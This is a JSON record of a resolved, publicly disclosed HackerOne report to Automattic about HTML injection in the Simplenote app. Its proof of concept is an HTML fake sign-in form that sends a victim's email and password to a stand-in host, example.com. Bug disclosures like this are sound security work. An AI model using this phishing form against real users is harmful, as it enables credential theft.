@@ -1,0 +1,121 @@
+{
+  "id": 289823,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODk4MjM=",
+  "url": "https://hackerone.com/reports/289823",
+  "title": "Improper markup sanitization.",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-13T12:01:59.713Z",
+  "submitted_at": "2017-11-13T12:01:59.713Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "edoverflow",
+    "url": "/edoverflow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-12-01T13:34:32.547Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-11-16T13:51:19.706Z",
+  "team_member_agreed_on_going_public_at": "2017-12-01T13:34:32.370Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\nOne can inject HTML into a note and create a login form that sends the user's details to a third-party server. This was a fun issue to play around with. I will let the PoC do most of the talking for a change.\n\n# PoC\n\nPaste the following HTML into a Simplenote. I am using the Simplenote app v.1.0.8 on Ubuntu 17.10.\n\n```html\nSign in to Simplenote\n\n<h1 class=\"signin\">Please sign in</h1>\n</br>\n<form name=\"login\" id=\"login\" action=\"http://example.com/login.php\">\n    <fieldset class=\"classic-fieldset\" style=\"border:none;\">\n        <div class=\"input-fields\">\n            <p>\n                <label for=\"email\">Email</label>\n                <input name=\"email\" id=\"email\" placeholder=\"Email\" required=\"\" type=\"email\" style=\"padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;\">\n            </p>\n            <div id=\"warn\"></div>\n            <p>\n                <label for=\"password\">Password</label>\n                <input name=\"password\" id=\"password\" placeholder=\"Password\" required=\"\" type=\"password\">\n            </p>\n        </div>\n        <br>\n        <p>\n            <input class=\"submit button\" value=\"Sign In\" type=\"submit\">\n        </p>\n        <p>\n            <input name=\"remember\" value=\"1\" id=\"check\" checked=\"checked\" type=\"checkbox\">\n            <label for=\"remember\" class=\"option\">Remember Me</label>\n        </p>\n        <p class=\"forgot\"><a href=\"#\">Forgot your password?</a></p>\n    </fieldset>\n</form>\n```\n\nI have published the note so that you can verify the issue: https://app.simplenote.com/p/th9BPG. The design could do with a little bit of work in order to make it more convincing, but I am sure you get the gist of the issue.\n\n{F239084}\n",
+  "weakness": {
+    "id": 74,
+    "name": "UI Redressing (Clickjacking)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 239084,
+      "file_name": "simplenote_form.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/239/084/fb8e770738e98e855911e3dcec9763aad5172420/simplenote_form.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_form.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_form.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NBYFOQ4%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T192525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDUOkW2FzFC6pm%2FNX1XaXFOMoMH%2Bp4H2WUiPJZqY%2BanwgIhAJFQ%2FlQr6I%2B0XtQDeMC2oBzuFsDrw8mLPnzuXsmpbd1PKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igyr7Rw5YRF0HZ7fR%2FYqjwW5Qd1a9sJiEkY%2B%2F3zgLJW1Urm240ouIXC%2Fgaxrdjh7p08XzP5hiWBzZJbdK8F0ucj7xdDtBM%2FwJEuTALPEVPodKNXLuo2iPiEfHLn6Mi044F%2B1kIUP0JUBECpklZXKfr1UYZwdUZr01mZv3kz%2FI3%2Fqn1w0AiWtbTG08ENHN%2BgPlNoi7FWCS6Su3fwHpMyve8Ws3n2ItTFL8KJU%2BDuMyVs7WA3fUYoB5SyTJtEeuJyq7xUt%2FIEq46i9%2B3R%2FZuXRS9MXDvEwJSenc7BovdJbkmrfHrNXldVgLVXfRDoI7rfzQg9kpiyZL%2FNtqP0eLFtwnOssULBgqtvcj8gS6xZol0yOSvzTatcqbdFaUBjUyLwnCyvalzYWpBG8iJ0hIsnKdVxgyOfm3eG%2FyMp0l2ze37ns7D2G42ReaM27z6o9MLu2%2FaXchNsGsACQUmyJzmQeaWkLKsN3t0CV1a4ikXVBJoKuSvE1Ow1COmF4Ga2gQGRvxhSKkmd%2BwqpMtiudIH2qoRrFAy9vYiLw3rNmj6PmurdKVSc5IQ9UNxuMF3Oody6yS5NDAZXXQXaG4wJ%2BdokigS90AYqlv9ISgI3CuNe08R9v67hxFBTRFYlkffzzWXjA55E3n%2FfB%2FfsKdvyOHus%2F4b%2B5ykH2GacB7nF7oaycS%2FIwvab5cWW5NKoEsiYhqg1qFqW%2F767vijcT54G9RDk99KaoL7RvH0XjSJZLGBH3ysF1apVxsziRJxMaqOdC92Psjzq17fzztkjL8IRjSu%2FmDkVRJoSg65hwJO7nyBDpZLnqoU4SyQXKhceVVzzVxrAvs1ULMjCrCNy8LLJuVpp4aVfgQBSuPISCgGpnNgRyRUBAEOg1IWUPYdUw49OAMQllMLXPwMYGOrABAWXJLzknPNalVhXK%2BCD1xQTo7%2FG%2F8w2hhdtgVQygVnyY5d%2BT9T7ud5%2BbdHuudRmYgmMmSjNEMp22ujihBkD%2Bff5FvQTNjj6uaoBxOVIT0HovM5Q%2FMD8whEgbTG5c7Z1wEG2nZEC1OV%2FfqWEtb5RMBmE5z0FRma6AYAY7IShPFPHfGzVOzU%2BB7oLUVCqVPJZZlTdn%2FX1dBFkKtdV4f1XLR%2BgKj30YXP3LHhQ1daucH9g%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7022ca7dd611a93ed820745fe94b50de57c5ae92426aae8706416a8871149856",
+      "file_size": 53517,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-12-16T13:51:19.802Z",
+  "allow_singular_disclosure_after": -245050445.86374313,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "jensec",
+    "sp1d3rs",
+    "yumi",
+    "asad0x01_",
+    "michan",
+    "mpz",
+    "r3y",
+    "eveeez",
+    "khizer47",
+    "4w3",
+    "and 9 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
